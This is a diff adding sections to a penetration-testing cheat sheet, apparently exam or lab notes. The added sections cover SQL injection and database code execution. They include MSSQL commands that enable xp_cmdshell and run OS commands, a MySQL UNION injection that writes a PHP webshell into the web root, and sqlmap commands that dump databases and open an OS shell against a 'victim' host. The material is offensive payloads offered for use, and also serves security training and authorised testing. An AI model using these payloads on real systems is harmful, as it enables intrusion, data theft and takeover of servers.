@@ -23,6 +23,7 @@
   * [Blind SQL Injection](#Blind-SQL-Injection)
   * [Error based SQL Injection](#error-based-sql-injection)
   * [Filter bypass](#filter-bypass)
+  * [SqlMap](#SqlMap)
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
 * [Webshell](#Webshell)
 * [ReverseShell](#ReverseShell)
@@ -209,6 +210,17 @@ SELECT name FROM sys.databases;
 SELECT * FROM {databaseName}.information_schema.tables;
 ~~~
 
+## Manual Code Execution
+
+~~~ sql
+SQL> EXECUTE sp_configure 'show advanced options', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
+SQL> RECONFIGURE;
+SQL> EXECUTE xp_cmdshell 'whoami';
+~~~
+
+
 # NFS - 2049
 
 ## Show Mountable NFS Shares
@@ -243,6 +255,13 @@ select version();
 select user();
 select system_user();
 show databases;
+~~~
+
+## Manual Code Execution
+
+*For this attack to work, the file location must be writable to the OS user running the database software.*
+~~~ sql
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
 ~~~
 
 ## Nmap script scan
@@ -447,6 +466,26 @@ if (@@VERSION)=9 select 1 else select 2;
 Quote bypass: [https://www.rapidtables.com/convert/number/ascii-to-hex.html](https://www.rapidtables.com/convert/number/ascii-to-hex.html)
 
 reference: [https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)
+
+
+## SqlMap
+*Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high volume of traffic, sqlmap should not be used as a first-choice tool during assignments that require staying under the radar.*
+
+~~~ bash
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
+
+# DB listing(technique: error based sqli)
+sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E --dbs --batch
+
+# Table listing(technique: error based sqli)
+sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB --tables --batch
+
+
+# Intercepting the POST request with Burp, Running sqlmap with os-shell
+sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"
+~~~
+
 
 
 # Dumb Shell to Fully Interactive Shell
